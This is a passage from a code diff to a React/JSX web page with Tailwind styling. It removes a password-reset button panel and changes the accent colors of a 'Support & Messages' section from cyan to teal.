-                    className="w-full rounded-3xl bg-orange-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-orange-400"
-                  >
-                    Send Reset Link
-                  </button>
-                </div>
-              </div>
-            </div>
-          </aside>
+            )}
+          </div>
         </section>
 
-        <section className="mt-6 glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
+        <section className="mt-6 glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-teal-500/5">
           <div className="flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
             <div>
-              <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">Support & Messages</p>
+              <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Support & Messages</p>
               <h2 className="mt-2 text-2xl font-semibold">Admin Replies & Updates</h2>
             </div>
             <span className="rounded-full bg-slate-900/80 px-4 py-2 text-xs uppercase tracking-[0.3em] text-slate-300 border border-slate-700">
